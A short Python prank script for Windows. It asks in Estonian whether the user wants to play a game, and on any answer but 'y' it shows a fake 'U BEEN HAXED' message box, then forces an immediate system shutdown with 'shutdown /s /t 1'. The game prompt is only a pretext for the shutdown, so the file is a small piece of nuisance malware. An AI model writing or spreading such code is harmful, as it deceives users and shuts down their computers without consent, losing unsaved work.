import os
import ctypes
import time

while True:
    check = input("Kas tahad seda mängu mängida? (y/n)")
    if check == "y":
        break
    else:
        MessageBox = ctypes.windll.user32.MessageBoxW
        MessageBox(None, 'U BEEN HAXED L0L TIME FOR SHUTDOWN', 'SITT LUGU LILLEKE', 0)
        time.sleep(5)
        os.system("shutdown /s /t 1")